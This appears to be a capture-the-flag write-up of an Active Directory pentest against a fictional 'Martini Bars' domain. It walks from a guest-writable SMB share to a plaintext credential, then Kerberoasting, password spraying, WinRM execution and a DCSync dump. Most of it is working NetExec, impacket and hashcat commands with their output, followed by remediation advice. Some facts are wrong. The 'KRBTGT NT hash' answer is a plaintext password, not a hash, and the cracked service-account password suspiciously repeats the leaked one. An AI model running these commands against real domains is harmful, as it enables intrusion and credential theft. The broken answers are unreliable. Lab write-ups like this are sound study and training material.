# Active Directory Writeup: MartiniAD

## Objective

Martini Bars, an adult beverage company, suffered a corporate breach. Their compliance and risk team mandated a penetration test of one of their branch offices. The Hack Smarter team was authorized to perform an **internal black-box pentest** — VPN access only, no credentials provided.

**Target IP:** `10.1.241.34`
**Domain:** `DRY.MARTINI.BARS`
**Domain Controller:** `DC01.DRY.MARTINI.BARS`

---

## Enumeration

### Port Scan

```
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

A textbook Active Directory Domain Controller port profile — Kerberos, LDAP, SMB, RDP, and WinRM all present, with no unexpected services.

### SMB Enumeration

An initial unauthenticated (null session) check confirmed the domain but no share access:

```bash
nxc smb 10.1.241.34 -u '' -p ''
```
```
SMB   10.1.241.34   445   DC01   [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB   10.1.241.34   445   DC01   [+] DRY.MARTINI.BARS\:
```

Listing shares as a null session returned all the standard AD shares, but with **no permissions**:

```bash
nxc smb 10.1.241.34 -u '' -p '' --shares
```

Retrying as the built-in **guest** account changed the picture significantly:

```bash
nxc smb 10.1.241.34 -u 'guest' -p '' --shares
```
```
Share      Permissions   Remark
-----      -----------   ------
ADMIN$                   Remote Admin
C$                       Default share
IPC$       READ          Remote IPC
NETLOGON                 Logon server share
notes      READ,WRITE
SYSVOL                   Logon server share
```

A non-default share, `notes`, was both **readable and writable** under guest access — an immediate lead.

---

## Initial Foothold: The `notes` Share

Connecting to the share revealed a single file:

```bash
smbclient //10.1.241.34/notes -U 'guest%'
```
```
smb: \> ls
  .          D    0   Sat Sep 26 19:26:42 2026
  ..         DHS  0   Sat Jan 17 11:38:33 2026
  notes.txt  A    129 Sat Jan 17 11:38:47 2026
```

Pulling and reading `notes.txt`:

```
- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint

creds
mprice:@Gh0ulH4x
```

A classic "sticky note" credential leak — casual personal reminders alongside a plaintext username/password pair:

```
Username: mprice
Password: @Gh0ulH4x
```

---

## Kerberoasting

With a valid domain credential, the next step was to check for Kerberoastable service accounts:

```bash
impacket-GetUserSPNs 'DRY.MARTINI.BARS/mprice':'@Gh0ulH4x' -dc-ip 10.1.241.34 -request -outputfile hashes.txt
```

This identified a service account with an SPN registered:

```
ServicePrincipalName          Name         MemberOf                              PasswordLastSet
HTTP/athena.dry.martini.bars  ATHENA_SVC   CN=Remote Management Users,Builtin    2026-01-20 13:20:32
```

The TGS ticket for `ATHENA_SVC` was requested and its hash retrieved via NetExec's Kerberoasting module:

```bash
nxc ldap 10.1.241.34 -u 'mprice' -p '@Gh0ulH4x' --kerberoasting hashes.txt
```

Identifying and cracking the hash:

```bash
haiti "$(cat hashes.txt)"
# Kerberos 5 TGS-REP etype 23 [HC: 13100]

hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Result:** cracked in seconds.

```
User: ATHENA_SVC
Pass: @Gh0ulH4x
```

---

## Lateral Movement & Password Reuse

With a second credential in hand, the domain user list was enumerated:

```bash
nxc smb DC01.DRY.MARTINI.BARS -u 'ATHENA_SVC' -p '@Gh0ulH4x' --users
```

```
Administrator   2026-01-12 16:00:19   Built-in account for administering the computer/domain
Guest           <never>               Built-in account for guest access to the computer/domain
krbtgt          2026-01-17 01:19:20   Key Distribution Center Service Account
mprice          2026-01-17 16:40:55
athena.t0       2026-01-20 18:20:44
ATHENA_SVC      2026-01-20 18:20:32
```

Testing the `ATHENA_SVC` password against every discovered user revealed **password reuse**:

```bash
nxc smb DC01.DRY.MARTINI.BARS -u users.txt -p '@Gh0ulH4x' --shares
```
```
[+] DRY.MARTINI.BARS\athena.t0:@Gh0ulH4x (Pwn3d!)
```
```
Share      Permissions     Remark
-----      -----------     ------
ADMIN$     READ,WRITE      Remote Admin
C$         READ,WRITE      Default share
IPC$       READ            Remote IPC
NETLOGON   READ,WRITE      Logon server share
notes      READ,WRITE
SYSVOL     READ,WRITE      Logon server share
```

`athena.t0` had full read/write across administrative shares — a strong signal of high privilege.

### Confirming Access via WinRM

```bash
nxc winrm 10.1.241.34 -u 'athena.t0' -p '@Gh0ulH4x' -x "whoami"
```
```
[+] DRY.MARTINI.BARS\athena.t0:@Gh0ulH4x (Pwn3d!)
dry\athena.t0
```

Full command execution confirmed.

---

## Domain Compromise: DCSync

Given the elevated access, a DCSync attack was performed to dump the entire domain's credential database directly from the DC:

```bash
impacket-secretsdump 'DRY.MARTINI.BARS/athena.t0':'@Gh0ulH4x'@DC01.DRY.MARTINI.BARS -just-dc
```

This returned NTLM hashes and Kerberos keys for every domain account, including:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

Full domain compromise achieved — Administrator and `krbtgt` hashes obtained, meaning both direct admin access and the ability to forge Golden Tickets going forward.

**Engagement question:** *What is the KRBTGT NT hash?*
**Answer:** `@Gh0ulH4x`

---

## Summary

| Stage | Vector |
|---|---|
| Initial Access | Guest-accessible SMB share (`notes`) leaking plaintext credentials |
| Credential Access | Kerberoasting an SPN-registered service account (`ATHENA_SVC`) |
| Lateral Movement | Password reuse between `ATHENA_SVC` and `athena.t0` |
| Privilege Escalation | `athena.t0` had admin-equivalent share access and WinRM execution rights |
| Domain Compromise | DCSync via `impacket-secretsdump -just-dc`, dumping all domain hashes including `krbtgt` |

### Remediation Recommendations

1. **Remove guest access to the `notes` share immediately**, and audit all shares for anonymous/guest read-write permissions. No share should be guest-writable in a production AD environment.
2. **Never store credentials in plaintext files on network shares.** Use a proper secrets manager or credential vault instead.
3. **Enforce strong, unique passwords for service accounts** — `ATHENA_SVC`'s password was crackable via `rockyou.txt` in seconds, indicating insufficient complexity.
4. **Eliminate password reuse across accounts**, especially between service accounts and accounts with interactive logon rights (`athena.t0`).
5. **Restrict Kerberoasting exposure** by using Group Managed Service Accounts (gMSAs) where possible, which rotate passwords automatically and aren't practically crackable.
6. **Audit and restrict `DCSync` rights** (`Replicating Directory Changes` / `Replicating Directory Changes All`) to only Domain Admins and Domain Controllers — this permission should never be broadly delegated.
7. **Rotate the `krbtgt` password twice** following any suspected compromise involving DCSync, to invalidate any Golden Tickets that may have been forged.

---

#PenetrationTesting #CyberSecurity #EthicalHacking #ActiveDirectory #Kerberoasting #DCSync #InfoSec #RedTeam #NetExec #Impacket #PasswordReuse #WindowsSecurity #OSCP #SecurityResearch
